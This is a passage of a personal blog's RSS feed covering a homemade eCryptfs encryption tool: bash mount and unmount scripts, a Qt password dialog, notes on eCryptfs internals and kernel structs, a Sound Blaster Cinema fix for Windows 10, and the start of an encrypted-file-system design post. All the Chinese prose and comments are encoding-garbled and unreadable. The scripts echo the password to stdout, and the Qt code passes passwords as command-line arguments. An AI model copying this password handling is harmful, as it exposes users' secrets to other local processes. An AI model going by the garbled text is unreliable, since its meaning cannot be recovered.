if [ ! -d $dir ];then ##å¤æ­ç®å½æ¯å¦å­å¨
mkdir -p $dir ###å»ºç«æ°æè½½ç¹ç®å½,éé¡¹pï¼å¯ä»¥åå»ºè¿ç»­æä»¶å¤¹
fi
echo &amp;quot;å å¯ç¨åºå¯å¨ï¼å¼å§å å¯â¦â¦
echo &amp;quot;è¯·è¾å¥å å¯å¯ç ï¼éæ©å å¯æ¹å¼ï¼&amp;quot;
## sudo mount -t ecryptfs $(pwd) $dir ### $( )ä¸ºå¼ç¨å½ä»¤ç»æ
##è°ç¨äº¤äºèæ¬æ¥å¤çåç¨æ·çäº¤äºè¿ç¨
echo $ECRYPTFS_REAL $dir $PASSWD $ECRYPTFS_TYPE $ECRYPTFS_BIT $ECRYPTFS_FS $ECRYPTFS_FILENAME
/bin/automount $ECRYPTFS_REAL $dir $PASSWD $PASS_TYPE $PASSPHRASE $ECRYPTFS_TYPE $ECRYPTFS_BIT $ECRYPTFS_FS $ECRYPTFS_FILENAME
&lt;/code>&lt;/pre>
&lt;h3 id="3-æè½½ç¹æä½èæ¬">3. æè½½ç¹æä½èæ¬&lt;/h3>
&lt;pre>&lt;code class="language-sh">#!/bin/bash
##ç¨æ¥å¯¹å½åæè½½ç¹è¿è¡å¸è½½å é¤
count=0
dir=&amp;quot;/tmp/mnt/ecryptfs$count&amp;quot;
gksudo df 1&amp;gt;/tmp/1.txt
while cat /tmp/1.txt |grep -q $dir 2&amp;gt;/dev/null ##æ£æ¥ç°å¨å­å¨çæè½½
do
echo $dir
let count=$count+1
sudo umount $dir &amp;amp;&amp;amp; rmdir $dirãã##å¸è½½æè½½ç¹ï¼å¸è½½æåçåæä¸å é¤æè½½ç¹
dir=&amp;quot;/tmp/mnt/ecryptfs$count&amp;quot;
done
&lt;/code>&lt;/pre>
&lt;h3 id="4-æ·»å å°é¼ æ å³é®èåçæ§è¡èæ¬">4. æ·»å å°é¼ æ å³é®èåçæ§è¡èæ¬&lt;/h3>
&lt;pre>&lt;code class="language-sh">#!/bin/bash
##æ·»å å°å³é®çæ§è¡èæ¬ï¼ç¨æ¥æå¼QTäº¤äºå¼çé¢ï¼è·åç¨æ·çè¾å¥ä¿¡æ¯
/home/tang/ecryptfs/imageconverter
#/bin/ecryptfs_mounted.sh&amp;amp;
&lt;/code>&lt;/pre>
&lt;h3 id="5-å¨qtè°ç¨æ§è¡æè½½èæ¬">5. å¨QTè°ç¨æ§è¡æè½½èæ¬&lt;/h3>
&lt;pre>&lt;code class="language-sh"> #!/bin/bash
##å¨QTä¸­è°ç¨è¯¥èæ¬ï¼è¯¥èæ¬çä¸»è¦åè½æ¯æ§è¡æè½½èæ¬ecryptfs_mounted.sh
REALFILE=$1
ECRYPTFSPATH=&amp;quot;/bin/ecryptfs_mounted.sh $REALFILE&amp;quot;
echo $REALFILE 1&amp;gt;/TMP/2.txt
echo
$ECRYPTFSPATH 1&amp;gt;&amp;gt;/tmp/2.txt
exec
$ECRYPTFSPATH
#exec gnome-terminal -x
$ECRYPTFSPATH
#/bin/ecryptfs_mounted.sh&amp;amp;
&lt;/code>&lt;/pre>
&lt;h2 id="äº-ï½ï½çé¢ç¨åºè®¾è®¡">äº. ï¼±ï¼´çé¢ç¨åºè®¾è®¡&lt;/h2>
&lt;pre>&lt;code class="language-c++">#include &amp;lt;QtGui&amp;gt;
#include &amp;quot;convertdialog.h&amp;quot;
ConvertDialog::ConvertDialog(QWidget *parent)
: QDialog(parent)
{
setupUi(this); //åå»ºå¹¶å¸å±å¥½ææççªå£é¨ä»¶
passwordEdit-&amp;gt;setEchoMode (QLineEdit::Password);//ç¨æ·å£ä»¤è¾å¥æ¡
filepasswordEdit-&amp;gt;setEchoMode (QLineEdit::Password);//æä»¶å¯ç è¾å¥æ¡
}
void ConvertDialog::on_browseButton_clicked()//éæ©è·¯å¾æé®è§¦å
{
QString initialName = sourceFileEdit-&amp;gt;text();//å å¯æä»¶å¤¹è·¯å¾è¾å¥æ¡
if (initialName.isEmpty())
initialName = QDir::homePath();//ä¸ºç©ºï¼ä½¿ç¨é»è®¤è·¯å¾
QString fileName =
QFileDialog::getExistingDirectory(this, tr(&amp;quot;Choose File&amp;quot;),
initialName);//å¼¹åºè®¡ç®æºè·¯å¾éæ©æ¡ï¼éæ©è·¯å¾å å¯
fileName = QDir::toNativeSeparators(fileName);//å å¯è·¯å¾
if (!fileName.isEmpty()) {
sourceFileEdit-&amp;gt;setText(fileName);//å°è·¯å¾ä¿¡æ¯ä¿å­èµ·æ¥
// buttonBox-&amp;gt;button(QDialogButtonBox::Ok)-&amp;gt;setEnabled(true);
}
}
void ConvertDialog::on_passwordEdit_textEdited(const QString &amp;amp;arg1)//passwordå¯ç æ¡
{
QRegExp regx (&amp;quot;^[^ ]+$&amp;quot;);// è®¾å®æ­£åè¡¨è¾¾å¼ï¼ä¸è½è¾å¥ç©ºæ ¼
QValidator *validator=new QRegExpValidator(regx,this);
passwordEdit-&amp;gt;setValidator(validator);
filepasswordEdit-&amp;gt;setValidator(validator);//æ­£åè¡¨è¾¾å¼æ§å¶è¾å¥æ¡å­ç¬¦æ ¼å¼
}
void ConvertDialog::on_filepasswordEdit_textEdited(const QString &amp;amp;arg1)//filepasswordå¯ç æ¡
{
QRegExp regx (&amp;quot;^[^ ]+$&amp;quot;);// ä¸è½è¾å¥ç©ºæ ¼
QValidator *validator2=new QRegExpValidator(regx,this);
passwordEdit-&amp;gt;setValidator(validator2);
filepasswordEdit-&amp;gt;setValidator(validator2);//æ­£åè¡¨è¾¾å¼æ§å¶è¾å¥æ¡å­ç¬¦æ ¼å¼
}
void ConvertDialog::on_shellButton_clicked()//ç¡®å®å å¯æé®è§¦å
{
//system(&amp;quot;/bin/ecryptfs_mounted.sh /home/tang/&amp;quot;); //ç´æ¥è°ç¨çæ¹å¼ï¼ä¼é»å¡è¿ç¨
//QProcess::execute(&amp;quot;/opt/run&amp;quot;)ãã//è°ç¨QTéé¢çå½æ°æ¥å®ç°ï¼ä¼é»å¡è¿ç¨
passwordEdit-&amp;gt;setInputMask(&amp;quot;&amp;quot;);//æåpasswordè¾å¥æ¡åå®¹
filepasswordEdit-&amp;gt;setInputMask(&amp;quot;&amp;quot;);//æåfilepasswordè¾å¥æ¡åå®¹
if(sourceFileEdit-&amp;gt;text().isEmpty()) // å¿é¡»è¾å¥å å¯è·¯å¾ï¼å¦åæ¥é
{
QMessageBox::warning(this,tr(&amp;quot;worning&amp;quot;),tr(&amp;quot; Please select the path to encrypt !&amp;quot;),QMessageBox::Yes);//æ¥éä¿¡æ¯
sourceFileEdit-&amp;gt;setFocus();//ç§»å¨åæ å°å å¯è·¯å¾è¾å¥æ¡
}
else if(passwordEdit-&amp;gt;text().isEmpty()||filepasswordEdit-&amp;gt;text().isEmpty())//å¦æä»»ä¸å¯ç ä¸ºç©ºï¼ç´æ¥æ¥é
{
QMessageBox::warning(this,tr(&amp;quot;worning&amp;quot;),tr(&amp;quot; user password or file password can't be empty!&amp;quot;),QMessageBox::Yes);
//æ¥éä¿¡æ¯
passwordEdit-&amp;gt;clear();//æ¸ç©ºç¨æ·å¯ç è¾å¥æ¡
filepasswordEdit-&amp;gt;clear();//æ¸ç©ºæä»¶å¯ç è¾å¥æ¡
passwordEdit-&amp;gt;setFocus();//ç§»å¨åæ å°ç¨æ·å¯ç è¾å¥æ¡
}
else
{
QString p1=passwordEdit-&amp;gt;text().trimmed();//å»é¤é¦å°¾ç©ºæ ¼
QString f1=filepasswordEdit-&amp;gt;text().trimmed();// å»é¤é¦å°¾ç©ºæ ¼
QString p2,f2;
int length1=p1.length();
int length2=f1.length();
for (int i=0;i&amp;lt;length1;i++)
{if (p1[i]!=' ') p2+=p1[i];}//å»é¤passwordä¸­çç©ºæ ¼
for (int i=0;i&amp;lt;length2;i++)
{if (f1[i]!=' ') f2+=f1[i];}//å»é¤filepasswordä¸­çç©ºæ ¼
QString define = p2+&amp;quot; &amp;quot;+&amp;quot;1 &amp;quot;+f2+&amp;quot; &amp;quot;+ecryptfstypeComboBox-&amp;gt;currentText().toLower()
+&amp;quot; &amp;quot;+ecryptfsbitComboBox-&amp;gt;currentText().toLower()
+&amp;quot; &amp;quot;+fileecryptfsComboBox-&amp;gt;currentText().toLower()
+&amp;quot; &amp;quot;+filenameecryptfsComboBox-&amp;gt;currentText().toLower();//è¾åºéè¦çä¿¡æ¯
qDebug()&amp;lt;&amp;lt;define;
QString ecryptfs_sh = sourceFileEdit-&amp;gt;text()+&amp;quot; &amp;quot;+define;//ååºä¿å­çä¿¡æ¯
//ecryptfs_sh.insert(0,QString(&amp;quot;/bin/tangguoze &amp;quot;));
qDebug()&amp;lt;&amp;lt;ecryptfs_sh;
QStringList arguments;
arguments &amp;lt;&amp;lt; ecryptfs_sh;//è¾åºä¿¡æ¯å°èæ¬ä¸­
QProcess *poc = new QProcess;//å®ä¹æ°è¿ç¨
poc -&amp;gt; start (&amp;quot;/bin/tangguoze&amp;quot;,arguments);//å¨QTä¸­è°ç¨å¯å¨è¿ç¨è¿è¡
}
}
&lt;/code>&lt;/pre>
&lt;h2 id="ä¸ecryptfså¼æºé¨åçåæ">ä¸ï¼eCryptfså¼æºé¨åçåæ&lt;/h2>
&lt;p>ä¸»è¦åä¸º7ä¸ªé¨åï¼&lt;/p>
&lt;ol>
&lt;li>
&lt;p>keystore&lt;br>
Keystoreé¨ä»¶ä»æä»¶ä¸­æä¾æä»¶å¤´ä¿¡æ¯ï¼å¹¶å°ä¿¡æ¯æ°æ®è½¬åç»calloutåºç¨ç¨åºãKeystoreä¸calloutåºç¨ç¨åºä¹åä½¿ç¨netlinkæºå¶éä¿¡ï¼éä¿¡çåèµ·èä¸ºkeystoreã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Calloutåºç¨ç¨åº&lt;br>
Calloutåºç¨ç¨åºæ ¹æ®ç®æ ç­ç¥å¯¹å¤´æä»¶ä¿¡æ¯ä½åºè¯ä¼°ï¼å¹¶ç»åºåç§æä½ï¼å¦ï¼è°ç¨åå°ç»åºç¨ç¨åºå¼¹åºå¯¹è¯æ¡è¦æ±å¯ç ç­è¯­ï¼æç¨ç§é¥è§£å¯ä¸ä¸ªä¼è¯ç§é¥ã&lt;br>
eCryptfsåæ ¸æ¨¡ååç¨æ·ç©ºé´ç§é¥ç®¡çä»£ç ä¹é´çä¸»è¦éä¿¡æ¯è¯·æ±ç§é¥ï¼ç±åæ ¸ç§é¥ç¯åèµ·ãCalloutåºç¨ç¨åºä»ç®å½åæç­ç¥ä¿¡æ¯ï¼è§£ææ¯ä¸ªæä»¶çå¤´ä¿¡æ¯ãä¸ºäºæ»¡è¶³æèµ·çå¬é¥è¯·æ±ï¼ä»å¯ä»¥è°ç¨PKI APIï¼æèç¨ç¹æ®çç­¾åæç´¢å¸¦çå¼å¾å¯ç ç­è¯­ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>eCryptfsåå°å¼¹åºå¯¹è¯æ¡è¾å¥å¯ç ç­è¯­&lt;br>
ä¸ºäºè½ç»ç¨æ·å¼¹åºå¯¹è¯æ¡æ¥è¾å¥å¯ç ç­è¯­ï¼eCryptfså¿é¡»æä¾å¾å°Xä¼è¯çééãè¿å¯è½éè¿è¿è¡ä¸ä¸ªåå°æ¥å®ç°ãeCryptfsåå°ä¾¦å¬ä¸ä¸ªsocketï¼å®çå°åä¿¡æ¯åå¨ç¨æ·çä¼è¯ç§é¥ç¯ä¸­ï¼æ è®ºä½æ¶ç­ç¥éè¦å¼¹åºä¸ä¸ªå¯¹è¯æ¡è¯·æ±å¯ç ç­è¯­æ¶ï¼calloutåºç¨ç¨åºé½è½æåsocketçå°åä¿¡æ¯ï¼å¹¶ç¨å®è¯·æ±åå°ç»ç¨æ·å¼¹åºå¯¹è¯æ¡ï¼æ¥çï¼åå°å°ç¨æ·çå¯ç ç­è¯­è¿åç»calloutåºç¨ç¨åºã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åæ ¸ç§é¥ç¯&lt;br>
åæ ¸ç§é¥ç¯ç¨äºç®¡çåä¿æ¤ç§é¥åè®¤è¯ç¹å¾ãeCryptfsç¨åæ ¸ç§é¥ç¯å­å¨è®¤è¯ç¹å¾ãèç¹å å¯ç»è®¡ä¿¡æ¯åç§é¥ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>PAM&lt;br>
PAMï¼å¯æå¥çè®¤è¯æ¨¡åï¼æä¾äºçµæ´»çè®¤è¯æºå¶ãeCryptfså«æä¸ä¸ªæ¨¡åï¼è½æè·ç¨æ·æ³¨åçå¯ç ç­è¯­ï¼å¹¶å°å®æ¾å¨ç¨æ·çä¼è¯ç§é¥ç¯ä¸­ï¼è¿ä¸ªå¯ç ç­è¯­ä½ä¸ºæ çå¼å¯ç ç­è¯­è®¤è¯ç¹å¾ã
eCryptfså¯ä»¥åºäºç­ç¥ï¼ä½¿ç¨è¿ä¸ªå¯ç ç­è¯­è¿è¡å å¯æä½ãå¦ï¼ç¨è¿ä¸ªå¯ç ç­è¯­ä»ç¨æ·çGunPGç§é¥ç¯ä¸­æåä»çç§é¥ï¼éè¿å­ç¬¦ä¸²å°ç§é¥æä½ï¼å°è¿ä¸ªå¯ç ç­è¯­ç´æ¥ç¨äºä¿æ¤æä»¶çä¼è¯ç§é¥ï¼è¿ä¸ªç§é¥ç­è¯­è¿å¯ä»¥ä¸å­å¨TPMä¸­çç§é¥ç»åå¨ä¸èµ·ï¼ç¨æ¥æä¾ä¸¤ä¸ªå å­çè®¤è¯ï¼å³ç¨æ·ä¸ºäºè®¿é®ä¸ä¸ªæä»¶ï¼ä»å¿é¡»æ³¨åå°ç¹æ®ä¸»æºï¼è¿éè¦ä½¿ç¨ç¹å¾çå¯ç ç­è¯­ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¬é¥è®¾æ½&lt;br>
eCryptfsæä¾äºå¯æå¥çPKIï¼å¬é¥è®¾æ½ï¼æ¥å£ï¼eCryptfsçPKIæ¨¡åå©ç¨GPGMEï¼GuuPG Made Easyï¼æ¥å£è®¿é®ç¨æ·çGnuPGç§é¥ç¯ãè¿ä¸ªæ¨¡åè½ä½¿ç¨ç¨æ·çæ³¨åå¯ç è§£å¯ç¨æ·ä¿å­çç§é¥ã&lt;br>
eCryptfsçTMP PKIæ¨¡åçTrouSerSä½¿ç¨æ¥å£ä¸TPMï¼å¯ä¿¡å¹³å°æ¨¡åï¼éä¿¡ï¼ç¨æ¥ä½¿ç¨å­å¨ç¡¬ä»¶ä¸­çç§é¥ï¼å°æä»¶ç»å®å°ä¸ä¸ªç¹å®çä¸»æºä¸ã
eCryptfs openCryptoki PKCS#11æ¡æ¶PKIéè¿åç§open Crytokçç¡¬ä»¶è®¾å¤ï¼å¯¹å¨ç¡¬ä»¶ä¸æ§è¡å¬é¥æä½çæºå¶æä¾äºæ¯æã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç®æ ä¸­å¿ç­ç¥ï¼Target-centric Polociesï¼&lt;br>
å½åºç¨ç¨åºåå»ºä¸ä¸ªæ°æä»¶æ¶ï¼eCryptfså¿é¡»ä½åºè®¸å¤çå³ç­ï¼å¦ï¼æä»¶æ¯å¦å å¯ï¼ç¨åªä¸ªå¯¹ç§°å¯ç å å¯æ°æ®ï¼æä»¶æ¯å¦å å¥HMACå¹¶éå IVï¼ä¼è¯ç§é¥é¿åº¦æ¯å¤å°ï¼å¦ä½ä¿æ¤ä¼è¯ç§é¥ï¼ç­ç­ã
eCryptfså°ç­ç¥å®ä¹æä»¶åºç¨äºç®æ ã&lt;br>
eCryptfsæä»¶ç³»ç»ç±åæ ¸ç©ºé´ç³»ç»åç¨æ·ç©ºé´ç³»ç»ä¸¤é¨åç»æãåæ ¸ç©ºé´ç³»ç»ç±åæ ¸ç©ºé´çåæ ¸keystoreãåæ ¸å å¯APIãeCryptfså±ãå å¯åæ°æ®ååºå±æä»¶ç³»ç»ç»æãèç¨æ·ç©ºé´ç±calloutåºç¨ç¨åºï¼eCryptfsåå°åPKI APIç­ç»æã&lt;br>
å¦å¤ï¼eCryptfsæä»¶ç³»ç»ä½¿ç¨äºLinuxåæ ¸çå¯é¥ç¯æå¡ãLinuxå¯æå¥è®¤è¯æ¨¡å(Pluggable Authentication Modules, PAM)ãå¯ä¿¡å¹³å°æ¨¡åï¼Trusten Platform Module, TPMï¼åGnuPGå¯é¥ç¯ï¼Ecryptfsè¶çº§åç§ææ°æ®ä¸»è¦åæ¬å å¯çåç§ä¿¡æ¯ï¼å¦ï¼è®¤è¯ç¹å¾ãå¯é¥ç¯ç­ã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre>
/* superblock private data. */
struct ecryptfs_sb_info {
struct super_block *wsi_sb;
struct ecryptfs_mount_crypt_stat mount_crypt_stat;
};
/* dentry private data. Each dentry must keep track of a lower
* vfsmount too. */
struct ecryptfs_dentry_info {
struct path lower_path;
struct ecryptfs_crypt_stat *crypt_stat;
};
/* inode private data. */
struct ecryptfs_inode_info {
struct inode vfs_inode;
struct inode *wii_inode;
struct file *lower_file;
struct mutex lower_file_mutex;
struct ecryptfs_crypt_stat crypt_stat;
};
/* file private data. */
struct ecryptfs_file_info {
struct file *wfi_file;
struct ecryptfs_crypt_stat *crypt_stat;
};
eCryptfsçè®¤è¯ç¹å¾åæ¬ä¼è¯å¯é¥ãå£ä»¤åç§é¥ç­ä»¥åä»ä»¬çç­¾åãä¼è¯å¯é¥å°å£ä»¤è¿è¡å å¯ãç»æeCryptfs_auth_tokeå­æ¾äºeCryptfsæä»¶ç³»ç»èå´åççè®¤è¯ç¹å¾ã
/* May be a password or a private key */
struct ecryptfs_auth_tok {
u16 version; /* 8-bit major and 8-bit minor */
u16 token_type;
#define ECRYPTFS_ENCRYPT_ONLY 0x00000001
u32 flags;
struct ecryptfs_session_key session_key;
u8 reserved[32];
union {
struct ecryptfs_password password;
struct ecryptfs_private_key private_key;
} token;
} __attribute__ ((packed));
å å¯ç»è®¡ä¿¡æ¯ç»æecryptfs_crypt_statå­å¥äºä¸æ¯ä¸ªå å¯æä»¶ç¸å³çå å¯ä¿¡æ¯ãå¦ï¼æä»¶çå å¯æä½æ è¯ãæä»¶å¤´çç»æä¿¡æ¯ç­ãååºå¦ä¸ï¼
/**
* This is the primary struct associated with each encrypted file.
*
* TODO: cache align/pack?
*/
struct ecryptfs_crypt_stat {
#define ECRYPTFS_STRUCT_INITIALIZED 0x00000001
#define ECRYPTFS_POLICY_APPLIED 0x00000002
#define ECRYPTFS_NEW_FILE 0x00000004
#define ECRYPTFS_ENCRYPTED 0x00000008
#define ECRYPTFS_SECURITY_WARNING 0x00000010
#define ECRYPTFS_ENABLE_HMAC 0x00000020
#define ECRYPTFS_ENCRYPT_IV_PAGES 0x00000040
#define ECRYPTFS_KEY_VALID 0x00000080
#define ECRYPTFS_METADATA_IN_XATTR 0x00000100
#define ECRYPTFS_VIEW_AS_ENCRYPTED 0x00000200
#define ECRYPTFS_KEY_SET 0x00000400
u32 flags;
unsigned int file_version;
size_t iv_bytes;
size_t num_header_bytes_at_front;
size_t extent_size; /* Data extent size; default is 4096 */
size_t key_size;
size_t extent_shift;
unsigned int extent_mask;
struct ecryptfs_mount_crypt_stat *mount_crypt_stat;
struct crypto_blkcipher *tfm;
struct crypto_hash *hash_tfm; /* Crypto context for generating
* the initialization vectors */
unsigned char cipher[ECRYPTFS_MAX_CIPHER_NAME_SIZE];
unsigned char key[ECRYPTFS_MAX_KEY_BYTES];
unsigned char root_iv[ECRYPTFS_MAX_IV_BYTES];
struct list_head keysig_list;
struct mutex keysig_list_mutex;
struct mutex cs_tfm_mutex;
struct mutex cs_hash_tfm_mutex;
struct mutex cs_mutex;
};
&lt;/pre></description></item><item><title>Some issues when I used my MSI GE60 2PG</title><link>http://www.guozet.me/post/Some-issues-with-MSI-GE60-2PG/</link><pubDate>Tue, 08 May 2018 12:00:00 +0000</pubDate><guid>http://www.guozet.me/post/Some-issues-with-MSI-GE60-2PG/</guid><description>&lt;p>There are some issues when I used my MSI GE60 2PG.&lt;/p>
&lt;h2 id="1-sound-blaster-cinema-1-potential-fix-on-windows-10">1. Sound Blaster Cinema 1 Potential fix on Windows 10&lt;/h2>
&lt;p>A way to get Sound Blaster Cinema 1 fully functional on windows 10 x64 bit. This is a fix for those that attempt to open the program and immediately get a crash or no windows popping up and the system tray icon freezes.&lt;/p>
&lt;!-- more -->
&lt;blockquote>
&lt;ol>
&lt;li>Uninstalled both my realtek HD audio drivers via control panel, and uninstalled SBC.&lt;/li>
&lt;li>Then rebooted and had ccleaner fix any registry errors. Reinstalled the drivers and SBC.&lt;/li>
&lt;li>Go into the programs folder here:&lt;br>
&lt;code>C:\Program Files (x86)\Creative\Sound Blaster Cinema\Sound Blaster Cinema&lt;/code>&lt;br>
Then delete the SBCinema.exe.config file.&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>Now the SBC is fully functional on Windows 10 64 bit and hopefully it works for everyone else to!&lt;/p></description></item><item><title>åºäºLinuxéæå å¯æä»¶ç³»ç»çè®¾è®¡ä¸å®ç°</title><link>http://www.guozet.me/post/Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/</link><pubDate>Mon, 07 May 2018 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/</guid><description>&lt;hr>
&lt;h1 id="éé¢èæ¯">éé¢èæ¯&lt;/h1>
&lt;p>ç°å¨äººä»¬å¯¹è®¡ç®æºç³»ç»å®å¨é®é¢èèçè¶æ¥è¶å¤ï¼å¯¹è®¡ç®æºç³»ç»å®å¨çè¦æ±ä¹è¶æ¥è¶ä¸¥æ ¼ï¼æ°æ®å®å¨æ©å·²ä¸å¨æ¯åæ¹åæ¿åºè¦å®³é¨é¨çç¹æ®éæ±ãç°å¨ï¼å ä¹ææçåºç¨é¢ååæ¬é¶è¡ãçµå­äº¤æãæ¿åºãäºèç½ç»ãä¸ç¨ç½ç»åä¼ä¸åé¨ç½ç»é½ææ°æ®å®å¨çéæ±ãä¸æ­¤åæ¶ä¸ªäººè®¡ç®æºçæ°æ®æ³å¯é®é¢ä¹æ¥ççªåºãå å¯ææ¯å¨ç°ä»£è®¡ç®æºç³»ç»å®å¨ä¸­æ®æ¼çè¶æ¥è¶éè¦çè§è²ãèå å¯æä»¶ç³»ç»æ¯å å¯ææ¯ä¸­æ¯è¾æçåéç¨çæ¹å¼ã&lt;/p>
&lt;!-- more -->
&lt;h1 id="éæ±åæ">éæ±åæ&lt;/h1>
&lt;p>å¯¹å ç§ç°æå¸åå å¯æä»¶ç³»ç»åæï¼æä»¬å¯ä»¥åç°ä¼ ç»çå å¯æä»¶ç³»ç»é½å­å¨çä¸åç¨åº¦çé®é¢ï¼ä¸»è¦éä¸­å¨è¿å ä¸ªæ¹é¢ï¼æ°æ®çä¿æ¤ä¸å®å¨ï¼æ§è½ä½ä¸ï¼å¯é¥ç®¡çæºå¶ä¸å¤å®åï¼çé¢äº¤äºæ§å·®ï¼éæåº¦å·®ã&lt;/p>
&lt;ul>
&lt;li>éå¯¹ç¨æ·ï¼æ®éUbuntuç­Linuxç³»ç»ä¸ªäººç¨æ·è&lt;/li>
&lt;li>ç¨æ·ç¹ç¹ï¼å¯¹å½ä»¤è¡æä½å¹¶ä¸æ¯å¾çæ&lt;/li>
&lt;/ul>
&lt;h1 id="è®¾è®¡ç®æ ">è®¾è®¡ç®æ &lt;/h1>
&lt;p>éåéæ±åæï¼æä»¬çè®¾è®¡ç®æ æ¯ï¼&lt;/p>
&lt;ul>
&lt;li>å¯¹ç³»ç»çè¿ç®éåº¦ä¸è½äº§çå¤ªå¤§çå½±åï¼&lt;/li>
&lt;li>æ´ä¸ªå è§£å¯è¿ç¨å¯¹ç¨æ·èè¨æ¯éæçï¼ææè®¿é®èå¯ä»¥å¾ç´è§çè¯»åæä»¶ææï¼èéææè®¿é®èè¯»åå°çé½æ¯å·²ç»å å¯è¿åçå¯æï¼&lt;/li>
&lt;li>å¨ç¸ä¼¼çæä½ç³»ç»ä¸­è½å¤å¾å¥½çè¿è¡ç§»æ¤ã&lt;/li>
&lt;/ul>
&lt;p>æ ¹æ®è¿äºéæ±ï¼å¹¶ç»åç°æå å¯æä»¶ç³»ç»çåæï¼æä»¬éç¨å å å¼æä»¶ç³»ç»çæ¹å¼æ¥å®ç°ãè®¾è®¡çç³»ç»æ¡æ¶å¦ä¸:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-12-20.png" alt="">&lt;/p>
&lt;h1 id="ç³»ç»ç®ä»">ç³»ç»ç®ä»&lt;/h1>
&lt;p>ç³»ç»çä¸»ä½åè½æ¯éè¿å å å¼æä»¶ç³»ç»æ¥å®ç°æ¬å°æ°æ®çå è§£å¯å·¥ä½ï¼å·ä½éè¦å®ç°çæï¼&lt;/p>
&lt;ul>
&lt;li>å å¯æä»¶ç³»ç»å¼åï¼ä»¥ä¸ä¸ªç¬ç«çåæ ¸æ¨¡åè¿è¡é¨ç½²ï¼&lt;/li>
&lt;li>ç¨æ·æä½çé¢çå¼åï¼å¯¹ç¨æ·æ´åå¥½ï¼&lt;/li>
&lt;li>ç¨æ·è®¤è¯æºå¶åæä»¶å å¯å¯ç éªè¯ç»åï¼æé«å®å¨æ§ï¼&lt;/li>
&lt;li>é¤äºæ­£æï¼ä¹å¯ä»¥å¯¹æä»¶åå å¯ï¼&lt;/li>
&lt;li>ç¨æ·å¯ä»¥èªç±éæ©ä¸å±æä»¶ç³»ç»æ¥å­æ¾å å¯æä»¶ã&lt;/li>
&lt;/ul>
&lt;h2 id="ç³»ç»æ¡æ¶">ç³»ç»æ¡æ¶&lt;/h2>
&lt;h3 id="readæä½">Readæä½&lt;/h3>
&lt;p>å½ç¨æ·åèµ·readæä½ï¼å å¯æä»¶ç³»ç»ä¸­ç¸å³å½æ°å°±è¢«VFSä¸­çç³»ç»è°ç¨sys_read()è°ç¨æ¥å¤çè¿ä¸ä¸ªè¯·æ±ï¼ä»å¿é¡»é¦åè°ç¨ä¸å±æä»¶ç³»ç»çread()ä»¥è¯»åå å¯è¿çæä»¶æ°æ®ï¼ç¶åè§£å¯æä»¶æ°æ®ï¼æåå°è§£å¯åçåæ°æ®è¿åç»ç¨æ·ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-12-54.png" alt="">&lt;/p>
&lt;p>writeæä½
ç¨æ·è¿ç¨çwrite()å½æ°ç»è¿ç³»ç»éç¨çVFSå±ï¼å°±è½¬åæäºç³»ç»è°ç¨sys_write()ï¼VFSå±çç³»ç»è°ç¨sys_write()å½æ°åè°ç¨å å å¼å å¯æä»¶ç³»ç»ä¸­çencrypt_write()å½æ°ï¼ç¶åcompressfs_write()å½æ°å¯¹ä¸å±ç¨æ·ç©ºé´ä¼ æ¥çæ°æ®è¿è¡å å¯ï¼ä¹ååè°ç¨ä½äºå å¯æä»¶ç³»ç»ä¸å±çå·ä½æä»¶ç³»ç»ä¸­write()å½æ°ï¼å°å å¯åçæ°æ®åå¥åºå±çå·ä½æä»¶ç³»ç»å½ä¸­å»ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-13-11.png" alt="">&lt;/p>
&lt;h3 id="æä»¶ç³»ç»è¯¦ç»ç»æå¾">æä»¶ç³»ç»è¯¦ç»ç»æå¾&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-13-37.png" alt="">&lt;/p>
&lt;h3 id="ç§é¥ç®¡ç">ç§é¥ç®¡ç&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-13-52.png" alt="">&lt;/p>
&lt;h1 id="ææå±ç¤º">ææå±ç¤º&lt;/h1>
&lt;h2 id="å·¥ä½æµç¨">å·¥ä½æµç¨&lt;/h2>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-14-09.png" alt="">&lt;/p>
&lt;h2 id="ç¨æ·æä½çé¢">ç¨æ·æä½çé¢&lt;/h2>
&lt;h3 id="ç¨æ·å è§£å¯æä½">ç¨æ·å è§£å¯æä½&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-14-33.png" alt="">&lt;/p>
&lt;h3 id="æä»¶æè½½åçæä½çé¢">æä»¶æè½½åçæä½çé¢&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-14-47.png" alt="">&lt;/p>
&lt;h1 id="ææ¯é¾ç¹">ææ¯é¾ç¹&lt;/h1>
&lt;h2 id="å å¯æä»¶ç³»ç»å®ç°æ¹å¼éæ©ä¸ç§éæ©">å å¯æä»¶ç³»ç»å®ç°æ¹å¼éæ©ï¼ä¸ç§éæ©ï¼&lt;/h2>
&lt;ul>
&lt;li>åºäºåºç¨å±æ¥å®ç°æä»¶çå è§£å¯ï¼&lt;/li>
